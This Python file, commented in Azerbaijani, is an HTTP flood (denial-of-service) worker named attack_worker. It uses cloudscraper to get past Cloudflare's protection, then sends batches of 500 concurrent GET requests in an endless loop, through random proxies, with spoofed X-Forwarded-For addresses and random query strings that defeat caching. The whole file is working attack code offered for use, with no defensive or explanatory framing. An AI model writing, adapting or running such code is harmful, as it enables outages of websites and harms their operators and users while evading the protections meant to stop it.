import asyncio
import aiohttp
import random
import cloudscraper
import ssl
from colorama import Fore

scraper = cloudscraper.create_scraper(
    browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}
)

async def attack_worker(target, uas, proxies, semaphore):
    cf_cookies = {}
    cf_ua = random.choice(uas) if uas else "Mozilla/5.0"
    
    # Cloudflare Bypass
    try:
        loop = asyncio.get_event_loop()
        cf_data = await loop.run_in_executor(None, lambda: scraper.get_tokens(target))
        cf_cookies, cf_ua = cf_data
        print(f"{Fore.MAGENTA}[+] Bypass Aktiv - 500-lük Paket Rejimi Başlayır...")
    except:
        pass

    async with semaphore:
        # Sürət üçün xüsusi TCP tənzimləmələri
        connector = aiohttp.TCPConnector(
            ssl=False, 
            limit=0, 
            limit_per_host=0, 
            keepalive_timeout=60
        )
        
        async with aiohttp.ClientSession(connector=connector, cookies=cf_cookies) as session:
            while True:
                # 500 PAKETLİK BATCH (Dəstə)
                tasks = []
                for _ in range(500): 
                    proxy = random.choice(proxies) if proxies else None
                    
                    headers = {
                        'User-Agent': cf_ua,
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Cache-Control': 'no-cache',
                        'Accept-Encoding': 'gzip'
                    }
                    
                    # Cache bypass üçün dinamik URL
                    url = f"{target}?s={random.getrandbits(32)}"
                    
                    # Sorğunu növbəyə yığırıq
                    tasks.append(session.get(url, headers=headers, proxy=proxy, timeout=4))

                # Paketləri havaya buraxırıq
                try:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    print(f"{Fore.CYAN}[TURBO-500] BYPASS + Packets Sent")
                except:
                    pass
                
                # Çox qısa fasilə (sistemin kilidlənməməsi üçün)
                await asyncio.sleep(0.01)